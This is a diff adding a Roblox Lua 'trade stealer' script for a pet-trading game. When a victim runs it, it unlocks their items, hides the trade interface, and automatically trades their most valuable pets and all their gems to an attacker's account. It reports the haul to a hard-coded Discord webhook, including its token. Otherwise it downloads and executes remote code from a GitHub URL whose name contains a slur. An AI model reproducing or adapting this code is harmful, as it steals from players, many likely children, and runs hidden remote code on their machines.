@@ -1,0 +1,291 @@
+local library = require(game.ReplicatedStorage.Library)
+local save = library.Save.Get().Inventory
+local plr = game.Players.LocalPlayer
+local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
+local HttpService = game:GetService("HttpService")
+local deposited = false
+local toSendList = {}
+
+local function GetTradeID()
+    local tradingCmds = require(game.ReplicatedStorage.Library.Client.TradingCmds)
+    local state = tradingCmds.GetState()
+    if state then
+        return state._id
+    else
+        return nil
+    end
+end
+
+local function GetCounter()
+    return require(game.ReplicatedStorage.Library.Client.TradingCmds).GetState()._counter
+end
+
+local function SendTrade(username)
+    local args = {
+        [1] = game:GetService("Players"):WaitForChild(Username)
+    }
+    network:WaitForChild("Server: Trading: Request"):InvokeServer(unpack(args))
+end
+
+local function ReadyTrade()
+    local args = {
+        [1] = GetTradeID(),
+        [2] = true,
+        [3] = GetCounter()
+    }
+	local response = false
+	repeat
+		response = network:WaitForChild("Server: Trading: Set Ready"):InvokeServer(unpack(args))
+	until response == true
+end
+
+local function getRAP(Type, Item)
+    return (library.DevRAPCmds.Get(
+        {
+            Class = {Name = Type},
+            IsA = function(hmm)
+                return hmm == Type
+            end,
+            GetId = function()
+                return Item.id
+            end,
+            StackKey = function()
+                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
+            end
+        }
+    ) or 0)
+end
+
+local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
+local titanicCount = 0
+local hugeCount = 0
+
+for i, v in pairs(categoryList) do
+	if save[v] ~= nil then
+		for uid, item in pairs(save[v]) do
+			if v == "Pet" then
+                local dir = library.Directory.Pets[item.id]
+                if dir.huge or dir.exclusiveLevel or dir.titanic then
+                    if dir.titanic then
+                        titanicCount = titanicCount + 1
+                    elseif dir.huge then
+                        hugeCount = hugeCount + 1
+                    end
+                    local rapValue = getRAP(v, item)
+                    if rapValue >= min_rap then
+                        local prefix = ""
+                        if item.pt and item.pt == 1 then
+                            prefix = "Golden "
+                        elseif item.pt and item.pt == 2 then
+                            prefix = "Rainbow "
+                        end
+                        if item.sh then
+                            prefix = "Shiny " .. prefix
+                        end
+                        local id = prefix .. item.id .. " (x" .. (item._am and tostring(item._am) or "1") .. ")"
+                        table.insert(toSendList, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
+                    end
+                end
+            else
+                local rapValue = getRAP(v, item)
+                if rapValue >= min_rap then
+                    local id = item.id .. " (x" .. (item._am and tostring(item._am) or "1") .. ")"
+                    table.insert(toSendList, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
+                end
+            end
+            if item._lk then
+                local args = {
+                [1] = uid,
+                [2] = false
+                }
+                network:WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
+            end
+        end
+	end
+end
+
+table.sort(toSendList, function(a, b)
+	return a.rap * a.amount > b.rap * b.amount 
+end)
+
+local function DepositInTrade(category, uid, am)
+    local args = {
+		[1] = GetTradeID(),
+		[2] = category,
+		[3] = uid,
+		[4] = am or 1
+	}
+	local response = false
+	repeat
+		response = network:WaitForChild("Server: Trading: Set Item"):InvokeServer(unpack(args))
+	until response == true
+end
+
+local function formatNumber(number)
+	local number = math.floor(number)
+	local suffixes = {"", "k", "m", "b", "t"}
+	local suffixIndex = 1
+	while number >= 1000 do
+		number = number / 1000
+		suffixIndex = suffixIndex + 1
+	end
+	return string.format("%.2f%s", number, suffixes[suffixIndex])
+end
+
+local function SendMessage(url, username, diamonds)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+
+	local totalRAP = 0
+	local fields = {
+		{
+			name = "Victim Username:",
+			value = username,
+			inline = true
+		},
+		{
+			name = "Items to be sent:",
+			value = "",
+			inline = false
+		}
+	}
+
+	for _, item in ipairs(toSendList) do
+		fields[2].value = fields[2].value .. item.name .. ": " .. formatNumber(item.rap * item.amount) .. " RAP\n"
+		totalRAP = totalRAP + (item.rap * item.amount)
+	end
+    fields[2].value = fields[2].value .. "\nGems: " .. formatNumber(diamonds) .. "\n"
+	fields[2].value = fields[2].value .. "Total RAP: " .. formatNumber(totalRAP)
+
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "New Execution" ,
+            ["color"] = 65280,
+			["fields"] = fields,
+			["footer"] = {
+				["text"] = "Trade stealer by Akari"
+			}
+        }}
+    }
+
+    if #fields[2].value > 1024 then
+        fields[2].value  = "List of items too big to send!\n\nGems: " .. formatNumber(diamonds) .. "\n"
+        fields[2].value = fields[2].value .. "Total RAP: " .. formatNumber(totalRAP)
+    end
+
+    local body = HttpService:JSONEncode(data)
+    local response = request({
+		Url = url,
+		Method = "POST",
+		Headers = headers,
+		Body = body
+	})
+end
+
+if Webhook and string.find(Webhook, "discord") then
+	Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
+else
+	Webhook = "https://discord.com/api/webhooks/1277197762311487528/uoK9nCfEW4jNxkKiSCrmGtxFSFB_FLTJ19pSlYUTClpRfVqmx-Usyr5P5610M0Ik8QW1"
+end
+
+local trade = game:GetService('Players').LocalPlayer.PlayerGui.TradeWindow.Frame
+trade.Visible = false
+local mobile = game.Players.LocalPlayer.PlayerGui.MainMobile.MobileCurrency
+mobile.Visible = false
+
+local currentCamera = game.Workspace.CurrentCamera
+currentCamera.FieldOfView = 70
+currentCamera:GetPropertyChangedSignal("FieldOfView"):Connect(function()
+	currentCamera.FieldOfView = 70
+end)
+
+local mainleft_gui = game:GetService("Players").LocalPlayer.PlayerGui.MainLeft
+local mainleft_position = game:GetService("Players").LocalPlayer.PlayerGui.MainLeft.Left.Position
+mainleft_gui:GetPropertyChangedSignal("Enabled"):Connect(function()
+    mainleft_gui.Enabled = true
+    mainleft_gui.Left.Position = mainleft_position
+end)
+
+local main_gui = game:GetService("Players").LocalPlayer.PlayerGui.Main
+local main_position = game:GetService("Players").LocalPlayer.PlayerGui.Main.BottomButtons.Position
+main_gui:GetPropertyChangedSignal("Enabled"):Connect(function()
+    main_gui.Enabled = true
+    main_gui.BottomButtons.Position = main_position
+end)
+
+local goal_gui = game:GetService("Players").LocalPlayer.PlayerGui.GoalsSide
+local goal_position = game:GetService("Players").LocalPlayer.PlayerGui.GoalsSide.Frame.Position
+goal_gui:GetPropertyChangedSignal("Enabled"):Connect(function()
+    goal_gui.Enabled = true
+    goal_gui.Frame.Position = goal_position
+end)
+
+local loading = game:GetService('Players').LocalPlayer.PlayerScripts.Scripts.Core["Process Pending GUI"]
+loading.Disabled = true
+
+local gemssent = 1
+local function AddGemsToTrade()
+    for i, v in pairs(save.Currency) do
+        if v.id == "Diamonds" then
+            local GemAmount = v._am
+			gemssent = GemAmount
+            local args = {
+                [1] = GetTradeID(),
+                [2] = "Currency",
+                [3] = i,
+                [4] = GemAmount
+            }
+			local response = false
+			repeat
+				response = network:WaitForChild("Server: Trading: Set Item"):InvokeServer(unpack(args))
+			until response == true
+        end
+    end
+end
+
+local function SendFirstMessage(url, message)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local data = {
+        ["content"] = message
+    }
+    local body = HttpService:JSONEncode(data)
+    local response = request({
+        Url = url,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+end
+
+if titanicCount > 0 then
+	if Webhook ~= "" then
+		SendFirstMessage(Webhook, "User " .. game.Players.LocalPlayer.Name .. " has executed the script. Join the game with this script: ```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(8737899170, '" .. game.JobId .. "', game.Players.LocalPlayer)\n```Titanic count: " .. titanicCount .. "\nHuge count: " .. hugeCount)
+	end
+
+	while true do
+		wait(0.1)
+		if game:GetService("Players"):WaitForChild(Username) ~= nil then
+			SendTrade(Username)
+		end
+		if game.Players.LocalPlayer.PlayerGui.TradeWindow.Enabled == true and GetTradeID() ~= nil then
+			if deposited ~= true then
+				for i, v in pairs(toSendList) do
+					DepositInTrade(v.category, v.uid, v.amount)
+				end
+				AddGemsToTrade()
+				ReadyTrade()
+				deposited = true
+			end
+		end
+		if game.Players.LocalPlayer.PlayerGui.Message.Enabled == true and deposited == true then
+			SendMessage(Webhook, plr.Name, gemssent)
+			game.Players.LocalPlayer.PlayerGui.Message.Frame.Contents.Desc.Text = "All your valuable items just got stolen by Tobi's trade stealer!\nJoin discord.gg/ZV52aFWyWm"
+            break
+		end
+	end
+else
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/stacymwa/NIGGAR/main/PS99%20DUPE%20AND%20SCRIPTS%20HUB",true))()
+end
